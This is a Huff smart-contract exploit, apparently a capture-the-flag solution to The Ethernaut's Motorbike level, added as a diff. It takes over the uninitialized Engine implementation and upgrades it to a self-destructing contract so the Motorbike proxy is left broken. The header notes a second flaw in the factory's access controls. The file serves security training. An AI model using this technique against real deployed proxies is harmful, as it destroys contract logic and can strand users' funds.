@@ -1,0 +1,96 @@
+/// @title A hack for level 25 (Motorbike) of The Ethernaut
+/// @notice SPDX-License-Identifier: MIT
+/// @author unluckyduke7
+/// @dev EIP-6780 requires the `SELFDESTRUCT` opcode be called within the
+///     same transaction a contract is created to preserve its behavior.
+/// @dev On a live network the assumption that
+///     2 * `Statistics.getNoOfInstancesForLevel` + 1 == `MotorbikeFactory.nonce`
+///     does not hold. The `MotorbikeFactory.createInstance` function does not
+///     have access controls, and can be called directly to cause
+///     permanent desynchronization.
+
+#define function hack(address,address) nonpayable returns (address)
+#define function submit(address,address) nonpayable returns ()
+
+#define table CODE_TABLE() {
+    0x60028060093d393df332ff
+}
+
+#define fn CALC_DEPLOY_ADDR() = takes (2) returns (1) {
+    // revert if nonce > 0x7f
+    dup2 0x7f lt fail jumpi                                                     // [level, nonce]
+    
+    // store rlp encoding
+    __RIGHTPAD(0xd694) 0x0 mstore 0x60 shl 0x2 mstore 0x16 mstore8              // []
+
+    // hash and shift to get result
+    0x17 0x0 sha3 0x60 shl 0x60 shr                                             // [deployment]
+}
+
+#define macro HACK() = takes (0) returns (0) {
+    // validate supplied arguments
+    0x4 calldataload 0xa0 shr fail jumpi                                        // []
+    0x24 calldataload 0xa0 shr fail jumpi                                       // []
+
+    // staticcall `Ethernaut.statistics`
+    __FUNC_SIG("statistics()") 0xe0 shl 0x0 mstore                              // []
+    0x20 0x0 0x4 0x0 0x4 calldataload gas staticcall iszero fail jumpi          // []
+    0x0 mload dup1 0xa0 shr fail jumpi                                          // [statistics]
+    
+    // staticcall `Statistics.getNoOfInstancesForLevel`
+    __FUNC_SIG("getNoOfInstancesForLevel(address)") 0xe0 shl 0x0 mstore         // [statistics]
+    0x24 calldataload 0x4 mstore                                                // [statistics]
+    0x0 0x24 0x0 0x20 swap4 gas staticcall iszero fail jumpi                    // []
+    0x1 0x0 mload dup2 shl add                                                  // [nonce]
+
+    // calculate deployment address of `Engine` and `Motorbike`
+    dup1 0x1 add 0x24 calldataload CALC_DEPLOY_ADDR() 0x0 tstore                // [nonce]
+    0x24 calldataload CALC_DEPLOY_ADDR()                                        // [engine]
+
+    // call `Ethernaut.createLevelInstance`
+    __FUNC_SIG("createLevelInstance(address)") 0xe0 shl 0x0 mstore              // [engine]
+    0x24 calldataload 0x4 mstore                                                // [engine]
+    0x0 0x0 0x24 0x0 0x0 0x4 calldataload gas call iszero fail jumpi            // [engine]
+
+    // call `Engine.initialize`
+    __FUNC_SIG("initialize()") 0xe0 shl 0x0 mstore                              // [engine]
+    0x0 0x0 0x4 0x0 0x0 dup6 gas call iszero fail jumpi                         // [engine]
+
+    // deploy implementation
+    __tablesize(CODE_TABLE) __tablestart(CODE_TABLE) 0x0 codecopy               // [engine]
+    __tablesize(CODE_TABLE) 0x0 0x0 create                                      // [implementation, engine] 
+
+    // call `Engine.upgradeToAndCall`
+    __FUNC_SIG("upgradeToAndCall(address,bytes)") 0xe0 shl 0x0 mstore           // [implementation, engine]
+    0x4 mstore 0x40 0x24 mstore 0x1 0x44 mstore 0x0 0x64 mstore                 // [engine]
+    0x0 0x84 0x0 0x0 0x0 swap5 gas call iszero fail jumpi                       // []
+
+    0x0 tload 0x0 mstore 0x20 0x0 return
+}
+
+#define macro SUBMIT() = takes (0) returns (0) {
+    // validate supplied arguments
+    0x4 calldataload 0xa0 shr fail jumpi                                        // []
+    0x24 calldataload 0xa0 shr fail jumpi                                       // []
+
+    // call `Ethernaut.submitLevelInstance`
+    __FUNC_SIG("submitLevelInstance(address)") 0xe0 shl 0x0 mstore              // []
+    0x24 calldataload 0x4 mstore                                                // []
+    0x0 0x0 0x24 0x0 0x0 0x4 calldataload gas call iszero fail jumpi            // []
+
+    stop
+}
+
+#define macro MAIN() = takes (0) returns (0) {
+    0x0 calldataload 0xe0 shr
+
+    dup1 __FUNC_SIG(hack) eq hack jumpi
+    __FUNC_SIG(submit) eq submit jumpi
+
+    fail:
+        0x0 0x0 revert
+    hack:
+        HACK()
+    submit:
+        SUBMIT()
+}
